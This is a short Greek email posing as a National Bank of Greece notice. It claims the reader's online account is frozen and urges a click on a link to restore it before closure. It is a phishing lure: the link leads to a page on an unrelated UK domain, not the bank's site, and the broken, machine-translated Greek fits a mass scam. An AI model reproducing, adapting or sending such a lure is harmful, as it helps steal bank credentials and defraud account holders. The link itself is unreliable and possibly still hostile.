 Αγαπητοί πελάτες, Τα αρχεία μας δείχνουν ότι η σύνδεση του λογαριασμού σας έχει παγώσει λόγω της ακόλουθους λόγους. Είσοδος σε δίκη με ανακριβείς πληροφορίες. Ελλιπής ή ελλείποντα στοιχεία που χρησιμοποιούνται για την Εθνική Τράπεζα ηλεκτρονικό λογαριασμό. Σας προτρέπουμε να αποκαταστήσει την Εθνική Τράπεζα σε απευθείας σύνδεση λογαριασμού αμέσως να αποτρέψει το κλείσιμο του λογαριασμού σας. Κάντε κλικ στον παρακάτω σύνδεσμο για να αποκατασταθεί η Εθνική Τράπεζα ηλεκτρονικό λογαριασμό: Εθνική Τράπεζα ηλεκτρονικό λογαριασμό (http://mail.derekmitchellelec.co.uk/nbg.gr/index.php) пїЅ 2010 Εθνική Τράπεζα. 